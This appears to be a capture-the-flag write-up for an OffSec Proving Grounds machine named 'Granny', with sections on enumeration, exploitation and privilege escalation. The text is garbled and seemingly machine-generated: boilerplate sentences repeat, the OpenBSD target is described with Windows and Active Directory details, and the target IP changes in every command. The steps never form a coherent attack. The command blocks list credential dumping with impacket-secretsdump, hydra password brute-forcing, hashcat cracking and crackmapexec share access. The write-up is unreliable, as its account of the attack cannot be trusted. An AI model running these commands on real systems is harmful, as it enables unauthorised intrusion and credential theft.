---
TitleSEO: "OffSec Proving Grounds — Granny (Hard OpenBSD) | ZureFX"
TitlePost: "OffSec Proving Grounds — Granny (Hard OpenBSD)"
Author: "ZureFX"
Description: "Full writeup for OffSec Proving Grounds Granny. Command Injection and DCSync to achieve hard compromise on OpenBSD."
Keywords: "windows, pwntilldawn, hackthebox, active directory, ctf"
URL: "https://zurefx.github.io/writeups/htb-granny-303.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-granny-303/"
Date: "2025-03-03"
Tags: "Windows, PwnTillDawn, HackTheBox, Active Directory, CTF"
Section: "writeups"
Lang: "en"
main_img: "htb-granny-303"
Permalink: "/writeups/htb-granny-303.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Granny** is rated **Hard** on OffSec Proving Grounds. It runs **OpenBSD** and the IP address during this analysis was `10.42.16.117`.

### Objectives

The application stored sensitive credentials in an unencrypted configuration file. The service account had excessive permissions assigned in Active Directory.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
feroxbuster -h
```

The service account had excessive permissions assigned in Active Directory. The application stored sensitive credentials in an unencrypted configuration file.

### Service Enumeration

The service account had excessive permissions assigned in Active Directory. The service account had excessive permissions assigned in Active Directory. The scheduled task ran with elevated privileges and could be abused for escalation.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.59.10.48
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
feroxbuster -h
```

The application stored sensitive credentials in an unencrypted configuration file. The service account had excessive permissions assigned in Active Directory.

### SMB Enumeration

The service was running without proper input validation, leading to injection vulnerabilities. Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.55.24.77
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.126.63.122 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.23.113.86 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Weak file permissions allowed modification of critical system files. The application stored sensitive credentials in an unencrypted configuration file. Initial enumeration revealed several interesting open ports on the target.

## Exploitation

### Vulnerability Identification

Token impersonation allowed elevation to SYSTEM privileges on the target. The web application was vulnerable to Server-Side Template Injection (SSTI). Token impersonation allowed elevation to SYSTEM privileges on the target.

Key finding: **DCSync**.

Command injection was possible through unsanitized user input in the search functionality. Post-exploitation enumeration revealed a path to domain administrator privileges.

### Initial Access

Lateral movement was facilitated by reusing discovered credentials across services. Command injection was possible through unsanitized user input in the search functionality.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.50.67.225/FUZZ
nmap -sCV -p993,389,53 10.113.154.39 -oN scan.txt
```

The database credentials were hardcoded in the application source code. Network traffic analysis revealed unencrypted communications containing user credentials. Post-exploitation enumeration revealed a path to domain administrator privileges.

## Privilege Escalation

### Enumeration

Unconstrained delegation was enabled on the compromised machine. Weak file permissions allowed modification of critical system files. Network traffic analysis revealed unencrypted communications containing user credentials.

```powershell
feroxbuster -h
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.110.37.121/FUZZ
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.76.6.25 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

### Exploitation

The database credentials were hardcoded in the application source code. Group Policy Preferences contained encrypted but recoverable credentials.

```powershell
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.129.44.78 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
feroxbuster -h
crackmapexec smb 10.119.3.241 -u administrator -p 'P@ssw0rd!' --shares
```

Weak file permissions allowed modification of critical system files. Command injection was possible through unsanitized user input in the search functionality.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

The target system was identified as running a vulnerable version of the service. The application stored sensitive credentials in an unencrypted configuration file.

## Summary

### Tools Used

- `impacket`
- `bloodhound`
- `dcomexec`
- `hashcat`
- `socat`
- `ldapsearch`
- `rpcclient`
- `wpscan`

### Key Takeaways

- Command Injection
- DCSync
- Open Redirect
- Unquoted Service Path
